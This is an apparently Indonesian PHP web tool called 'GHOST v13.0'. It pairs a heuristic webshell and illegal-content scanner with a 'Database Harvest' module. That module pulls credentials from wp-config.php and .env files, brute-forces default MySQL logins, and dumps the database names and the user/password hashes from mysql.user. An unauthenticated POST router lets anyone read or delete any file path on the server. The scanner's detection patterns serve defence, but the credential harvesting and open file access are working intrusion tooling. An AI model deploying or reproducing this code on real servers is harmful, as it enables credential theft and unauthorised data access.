<?php
/**
 * GHOST v13.0 — Deep Heuristic & DB Brute-Force
 */
@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// ENGINE EKSEKUSI
function g_exec($cmd, $timeout = 20) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return $out; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return $out; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return $out; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
    }
    return "[-] Blocked.";
}
function g_read($path) {
    if (!@is_file($path)) return "";
    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
    return g_exec('cat ' . escapeshellarg($path));
}

// ==========================================
// DEEP INSPECTOR (HEURISTIC)
// ==========================================
function g_scan_batch($dir, $offset = 0, $limit = 30) {
    $res = ['files'=>[], 'done'=>false, 'total'=>0];
    $ignore = ['jpg','jpeg','png','gif','mp4','mp3','pdf','zip','tar','gz','sqlite','svg','ico','woff','ttf','eot'];
    
    $all_files = [];
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
        foreach ($it as $f) {
            if (!$f->isFile()) continue;
            if (in_array(strtolower($f->getExtension()), $ignore)) continue;
            $all_files[] = $f->getPathname();
        }
    } catch (Throwable $e) {}

    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);

    $illegal_kw = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol'];
    
    foreach ($batch as $path) {
        $c = g_read($path);
        $size = @filesize($path);
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $filename = basename($path);
        
        $findings = []; // Kumpulan alasan kenapa file ini mencurigakan
        $type = '';
        
        // 1. Analisa Backdoor / Malware
        if ($size === 0 && $ext === 'php') {
            $type = 'Empty Shell'; $findings[] = "File berukuran 0 byte (kemungkinan backdoor yang gagal di-upload atau sisa hacking).";
        } elseif (stripos($c, 'eval(') !== false) {
            $type = 'Obfuscated RCE'; $findings[] = "Terdapat perintah 'eval()' yang mengeksekusi kode acak (Sangat khas backdoor).";
        } elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
            $type = 'Direct Webshell'; $findings[] = "Mengeksekusi perintah shell langsung dari parameter HTTP.";
        } elseif (preg_match('/(base64_decode|gzinflate|str_rot13)\s*\(\s*[\'"][A-Za-z0-9+\/=]{50,}/i', $c)) {
            $type = 'Encrypted Payload'; $findings[] = "Terdapat teks terenkripsi panjang (Obfuscation/Malware).";
        } elseif (preg_match('/(c99|r57|b374k|wso|alfa|indoxploit)/i', $c) || preg_match('/(c99|r57|b374k|wso)\.php/i', $path)) {
            $type = 'Known Webshell'; $findings[] = "Nama atau signature cocok dengan webshell publik populer.";
        } elseif (!$ext && stripos($c, '<?php') !== false) {
            $type = 'Hidden PHP'; $findings[] = "File tidak berekstensi tapi berisi kode PHP (Upaya penyamaran).";
        } elseif (in_array($ext, ['jpg','png','gif']) && stripos($c, '<?php') !== false) {
            $type = 'Polyglot Malware'; $findings[] = "File gambar yang disisipi kode PHP (Bypass upload).";
        }
        
        // 2. Analisa Konten Ilegal (Judi, Porno, Scam)
        $found_kw = [];
        foreach ($illegal_kw as $k) { 
            if (preg_match('/\b'.preg_quote($k,'/').'\b/i', $c)) $found_kw[] = $k; 
        }
        if (count($found_kw) > 0) {
            if ($type === '') $type = 'Illegal Content';
            $findings[] = "Mengandung kata kunci ilegal: " . strtoupper(implode(', ', $found_kw));
        }

        if ($type !== '') {
            $res['files'][] = [
                'path'=>$path, 
                'type'=>$type, 
                'desc'=>implode(' | ', $findings)
            ];
        }
    }
    return $res;
}

// ==========================================
// DATABASE HARVEST (BRUTE-FORCE)
// ==========================================
function g_db_harvest() {
    $logs = []; $info = [];
    
    // Metode 1: Baca Config Utama
    foreach (['wp-config.php', '.env', 'configuration.php', 'config/database.php'] as $cf) {
        if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
            $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
            preg_match('/(?:DB_NAME|database)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $n);
            if ($u[1] && $p[1]) { 
                $logs[] = "[+] Config Ditemukan di $cf"; 
                $info = ['user'=>$u[1], 'pass'=>$p[1], 'db'=>$n[1] ?? '']; 
                break; 
            }
        }
    }

    // Metode 2: Grep seluruh web (Jika Config Utama tidak ada)
    if (empty($info)) {
        $logs[] = "[*] Config Utama tidak ada. Mencari via GREP...";
        $grep = g_exec("grep -rEl 'mysql_connect|mysqli_connect|DB_PASSWORD' " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " 2>/dev/null | head -n 3");
        if (trim($grep)) {
            $logs[] = "[+] File mengandung sambungan DB:\n$grep";
            foreach (explode("\n", trim($grep)) as $file) {
                $c = g_read($file);
                if (preg_match('/pass(?:word)?[\'"]?\s*(?:=>|:|=)\s*[\'"]([^\'"]+)/i', $c, $p)) {
                    $info = ['pass'=>$p[1]]; $logs[] = "[!] Kemungkinan Password: " . $p[1]; break;
                }
            }
        }
    }

    // Metode 3: Brute-force kredensial umum
    if (empty($info['user'])) {
        $logs[] = "[*] Mencoba kredensial default MySQL...";
        $defaults = [['root',''], ['root','root'], ['admin',''], ['admin','admin']];
        foreach ($defaults as $d) {
            if (@mysqli_connect('localhost', $d[0], $d[1])) {
                $info = ['user'=>$d[0], 'pass'=>$d[1]];
                $logs[] = "[!] Berhasil login pakai kredensial default: {$d[0]} : {$d[1]}";
                break;
            }
        }
    }

    // Eksekusi Dump Data
    if (!empty($info['user'])) {
        $logs[] = "[*] Mencoba koneksi ke Database...";
        $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], $info['db'] ?? '');
        if ($conn) {
            $logs[] = "[!] KONEKSI BERHASIL!";
            // Ambil daftar database
            $q = @mysqli_query($conn, "SHOW DATABASES");
            $logs[] = "--- Daftar Database ---";
            while($r = mysqli_fetch_array($q)) { $logs[] = $r[0]; }
            
            // Coba ambil user
            $q = @mysqli_query($conn, "SELECT user, password FROM mysql.user LIMIT 5");
            if($q) { $logs[] = "--- MySQL Users ---"; while($r = mysqli_fetch_assoc($q)) $logs[] = json_encode($r); }
        } else {
            $logs[] = "[-] Koneksi Gagal: " . mysqli_connect_error();
        }
    } else {
        $logs[] = "[-] Tidak ada kredensial yang berhasil didapatkan.";
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// ROUTER
$act = $_POST['act'] ?? '';
if ($act) {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');
    
    if ($act === 'scan') echo json_encode(g_scan_batch($GHOST_ROOT, (int)$_POST['offset'], 30));
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v13.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    input, button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-family:monospace; margin-bottom:5px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; font-size:12px; }
    table { width:100%; border-collapse:collapse; margin-top:10px; font-size:12px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; color:#0f0; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    .btn-red { border-color:#f00; color:#f00; }
    .btn-red:hover { background:#f00; color:#000; }
    #modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; }
    #modal-content { background:#000; border:1px solid #0f0; margin:10% auto; padding:20px; width:80%; max-height:80%; overflow:auto; }
</style>
</head>
<body>

<div id="modal"><div id="modal-content"><pre id="modal-text"></pre><br><button onclick="document.getElementById('modal').style.display='none'">Close</button></div></div>

<div class="box">
    <h2>[+] Deep Inspector (Heuristic)</h2>
    <button onclick="startScan()">Scan Semua File</button>
    <div id="scan-status" style="margin-top:10px; color:#ff0;">Idle.</div>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] Database Harvest (Brute-Force)</h2>
    <button onclick="run('db_scan','db-result')">Scan & Hack DB</button>
    <pre id="db-result">Waiting...</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    return await r.json();
}

// SCAN (Pagination & UI)
async function startScan() {
    let offset = 0; let mal = [];
    document.getElementById('scan-results').innerHTML = '';
    document.getElementById('scan-status').innerText = 'Memulai...';

    while (true) {
        document.getElementById('scan-status').innerText = `Menganalisa file ke-${offset}...`;
        try {
            const d = await api('scan', {offset: offset});
            d.files.forEach(f => mal.push(f));
            if (d.done) {
                document.getElementById('scan-status').innerText = `Selesai! Ditemukan ${mal.length} file berbahaya/ilegal dari total ${d.total} file.`;
                renderScan(mal);
                break;
            }
            offset += 30;
        } catch(e) { document.getElementById('scan-status').innerText = 'Error: ' + e.message; break; }
    }
}

function renderScan(mal) {
    if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p style="color:#0f0;">File Bersih.</p>'; return; }
    let h = `<table><tr><th>Klasifikasi</th><th>File</th><th>Analisis / Tujuan</th><th>Aksi</th></tr>`;
    mal.forEach(x => {
        h += `<tr>
            <td><span class="badge">${esc(x.type)}</span></td>
            <td>${esc(x.path)}</td>
            <td>${esc(x.desc)}</td>
            <td><button onclick="viewFile('${encodeURIComponent(x.path)}')">View</button>
                <button class="btn-red" onclick="delFile('${encodeURIComponent(x.path)}')">Delete</button></td>
        </tr>`;
    });
    h += `</table>`;
    document.getElementById('scan-results').innerHTML = h;
}

async function viewFile(enc) {
    document.getElementById('modal').style.display = 'block';
    document.getElementById('modal-text').innerText = 'Loading...';
    const d = await api('read_file', {path: decodeURIComponent(enc)});
    document.getElementById('modal-text').innerText = d.content.slice(0, 5000);
}
async function delFile(enc) {
    if(!confirm('Hapus file ini?')) return;
    await api('del_file', {path: decodeURIComponent(enc)});
    startScan();
}

// DB HARVEST
async function run(act, target) {
    document.getElementById(target).innerText = 'Running...';
    try {
        const d = await api(act);
        document.getElementById(target).innerText = JSON.stringify(d,null,2);
    } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
}
</script>
</body>
</html>
